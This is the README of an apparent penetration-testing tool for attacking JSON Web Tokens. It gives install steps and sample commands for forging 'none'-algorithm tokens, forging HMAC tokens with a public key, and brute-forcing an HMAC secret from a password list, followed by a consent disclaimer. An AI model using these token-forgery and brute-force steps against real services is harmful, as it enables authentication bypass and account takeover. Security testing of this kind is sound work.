# JWT Swiss Knife
A tool for conducting different types of attacks against JWT
Credit to Tim Mclean for the great blogpost about JWT vulnerabilities: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ 

# Installation
pip install -r requirements.txt

# Sample Usage
Method 1 - Create a 'none' token:

./jwt_sk.py -method 1 -body '{"userEmail":"oz@cyberint.com", "rememberMe":false, "exp":1473240911, "timestamp":"06-Sep-2016 05:35:11:774"}'

Method 2 - Create an 'HMAC' signed token using public key:

./jwt_sk.py -method 2 -body '{"userEmail":"oz@cyberint.com", "rememberMe":false, "exp":1504676111, "timestamp":"06-Sep-2017 05:35:11:774"}' -pk ~/Desktop/pubkey.pem -alg HS512

Method 3 - Bruteforce HMAC secret:

./jwt_sk.py -method 3 -jwtoken "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aW1lc3RhbXAiOiIwNi1TZXAtMjAxNyAwNTozNToxMTo3NDQiLCJ1c2VyRW1haWwiOiJvekBjeWJlcmludC5jb20iLCJleHAiOjE1MDQ2NzYxMTF9.qkBZ_mjWCLOBUfmdcMR0e0MEaEuU8oykFALea3AfLpQ" -secrets ./passlist -alg HS256

# Screenshots

![Alt text](https://s29.postimg.org/py9b9o78n/Capture.png)

# Disclaimer

This tool is only for testing and academic purposes and can only be used where strict consent has been given.
Do not use it for illegal purposes.
